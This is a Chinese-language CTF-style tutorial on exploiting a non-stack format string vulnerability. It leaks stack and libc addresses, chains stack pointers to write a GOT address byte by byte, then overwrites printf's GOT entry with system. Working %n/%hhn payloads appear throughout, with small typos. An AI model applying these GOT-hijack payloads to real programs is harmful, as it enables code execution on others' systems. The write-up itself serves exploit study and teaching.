# 非栈上的格式化字符串利用

## 泄露

第一步是普通的aslr泄露和libc泄露, 可以直接用栈上已有的数据

![image-20261023122410007](./image-20261023122410007.png)

分别对应的是"%6$p"和"%7$p"

## 结构寻找

![image-20261023122656828](./image-20261023122656828.png)

要找的结构分别为 : 三联, 三联对应的二联, 以及space_stcak

白色的是三联和二联, 红色的是space_stcak, 栈上可以找到很多个space_stcak, 只要里面的数据是00000000就可以

### 原理解析

为什么要这些结构呢? 以下gdb示例图

```
A->B->C->...  #三联
 
D->0          #space_stack

B->C->...     #二联
```

我们的期望是找到一个这样的结构

我们使用的payload通常为"%{n}c%${num}n", 对于以上的结构, 我们能做到的事目前只有向B和C解引用后的地址写入内容

首先第一步是对三联使用payload, **将三联, 二联和space_stcak连在一起**

```
A->B->D->0   #三联

D->0         #space_stack

B->D->0      #二联
```

然后下一步是向原本的二联写入单个字节(假设是0x10), 达到以下效果

```
A->B->D->0x10   #三联

D->0x10         #space_stack

B->D->0x10      #二联
```

接着我们需要继续使用payload修改三联, 让**指针向后移动**一个字节

```
A->B->(D+1)->0   #三联

D->0x10          #space_stack

B->(D+1)->0      #二联
```

然后对二联进行内容的写入

```
A->B->(D+1)->0x20   #三联

D->0x2010           #space_stack

B->(D+1)->0x20      #二联
```

重复上述步骤, 其中三联用于挪动指针, 二联用于写入数据

---

```
A->B->(D+2)->0   #三联

D->0x2010        #space_stack

B->(D+2)->0      #二联
```

```
A->B->(D+2)->0x30   #三联

D->0x302010         #space_stack

B->(D+2)->0x30      #二联
```

---

```
A->B->(D+3)->0   #三联

D->0x302010      #space_stack

B->(D+3)->0      #二联
```

```
A->B->(D+3)->0x40   #三联

D->0x40302010       #space_stack

B->(D+3)->0x40      #二联
```

以上便成功把一个四字节的整形0x40302010写入了栈上

---

## 回到gdb中

我们期望写入栈上的内容是got表, 也就是`0x404000`

### 将三二联和space_stcak连在一起

![image-20261023124322657](./image-20261023124322657.png)

观察到此时三联的末尾和space_stcak只有末尾的两个字节不同, 因此选用的payload是%hn, 这个格式化符号可以做到对short类型进行修改

对于"%{n1}c%${n2}hn"来说, 其中的n1就是想把三联末尾的低二字节修改成什么, 由于先前泄露过栈地址(红框中), 可以直接使用泄露的栈地址通过偏移得到目标

![image-20261023124407077](./image-20261023124407077.png)

+ n1的计算

gdb中原生支持这种指令, 也就是即使存在aslr, 只要泄露了刚刚红框中的栈地址, 就可以通过-0x28得到space_stcak的地址

那么就可以使用python中的格式化字符串机制得到n1 = ((stack-0x28)&0xffff)

+ n2的计算

由于我们要改的是三联, 所以n2就是三联对应的index, 之前提到过

```
printf(fmt,arg1,arg2...)
```

寄存器会传入**1个格式化符号fmt**和**5个fmt可以格式化的参数**, 那么三联对应的就是第**5+4=9**号

也就是这里的n2=9

---

所以第一段payload是

```
payload=f"%{space_stack&0xffff}c".encode()+b"%9$hn\x00"
```

效果如下

![image-20261023124943159](./image-20261023124943159.png)

可以看到满足了

```
A->B->D->0   #三联

D->0         #space_stack
```

这样的结构

### 开始写入got表

然后我们就该写入got表了

由于我们只能一个字节一个字节写入, 所以最先写入的字节是`\x00`

x想写入space_stcak, 此刻就要借助**二联**

但是由于这里本身就是0, 所以这一步可以被省略; 不过为了演示效果, 我使用gdb的命令 : `set *0x7fffffffda68(也就是space_stcak)=0x10`强行写入一个0x10, 这样就可以看到`\x00`被写入的效果了

![image-20261023125405662](./image-20261023125405662.png)

三联位于偏移0x25(37), 按照先前的计算方法也就是37+5+1=43(这里加1是因为偏移是从00开始的), 也就是这里的n2为43, 因为n1是0所以整个`%{n1}c`都不需要写了

---

第二段的payload如下

```
payload=b"%43$hhn\x00"
```

发送这个payload后可以看到`\x00`被写入了

![image-20261023125726011](./image-20261023125726011.png)

### 指针移动

接下来就是写入got表的下一位0x40, 我们就要回到三联

刚刚把space_stack写入三联使用的payload是`payload=f"%{space_stack&0xffff}c".encode()+b"%9$hn\x00"`

我们只需要将`space_stack+1`写入三联, 只需要简单修改一下刚刚的payload就好

```
payload=f"%{(space_stack&0xffff)+1}c".encode()+b"%9$hn\x00"
```

效果如下

![image-20261023130215719](./image-20261023130215719.png)

### 继续写入got表

此时还是对二联进行写入, 此时要写入的是0x40, 那么n1=0x40, n2不变还是43

所以payload如下

```
payload=b"%64c%43$hhn\x00"
```

效果如下

![image-20261023130359648](./image-20261023130359648.png)

### 重复上述步骤

向后移动指针

```
payload=f"%{(space_stack&0xffff)+2}c".encode()+b"%9$hn\x00"
```

![image-20261023130536343](./image-20261023130536343.png)

写入got表的下一字节

```
payload=b"%64c%43$hhn\x00"
```

![image-20261023130633223](./image-20261023130633223.png)

此时便会发现got表的三个字节被完整写入了栈上, 可以使用%21$n进行修改了

---

## 重复整个got表写入栈上的流程

由于把printf的地址修改为system的地址需要修改2.5字节, 其实也就是三字节, 一次性修改很可能导致段错误

所以还需要在栈上再找一个space_stcak2, 写入`got+1`

把`got+1`写入栈上的步骤和刚刚没用区别, 只是数值会稍微变化

这里直接挑选space_stcak2=space_stack+8 : `space_stack=space_stack+8`

使用的pyaload如下

```
printf_got=0x404001

payload=f"%{space_stack&0xffff}c".encode()+b"%9$hn\x00"
io.send(payload.ljust(0x1000,b'\x00'))

payload=b"%c%43$hhn\x00"
io.send(payload.ljust(0x1000,b'\x00'))

payload=f"%{(space_stack&0xffff)+1}c".encode()+b"%9$hn\x00"
io.send(payload.ljust(0x1000,b'\x00'))

payload=b"%64c%43$hhn\x00"
io.send(payload.ljust(0x1000,b'\x00'))

payload=f"%{(space_stack&0xffff)+2}c".encode()+b"%9$hn\x00"
io.send(payload.ljust(0x1000,b'\x00'))

payload=b"%64c%43$hhn\x00"
io.send(payload.ljust(0x1000,b'\x00'))
```

最终效果如下

![image-20261023131239523](./image-20261023131239523.png)

现在got和got+1都在栈上, 就可以完成最后的got表劫持了

## got表劫持

```
...
got  :
got+1:
...
```

我们最终的目的是把system的地址: `base+0x58750`覆盖掉当前的`base+0x60100`

只需要修改3字节就够了, 而且栈上有两个got表, 那么最终

```
...
got  : system&0xff
got+1: (system>>8)0xffff
...
```

这样改就可以了

其中先把`system&0xff`和`(system>>8)0xffff`算出来

```
t1=system&0xff
t2=(system>>8)&0xffff
```

然后got和got+1的index分别是15+5+1=21和16+5+1=22

那么payload就是

```
payload=f"%{t1}c%21$hhn%{t2-t1}c%22$hn" # 注意第二段需要t2-t1, 因为t1的长度已经在第一段计算过了
```

最终效果如下

![image-20261023131949806](./image-20261023131949806.png)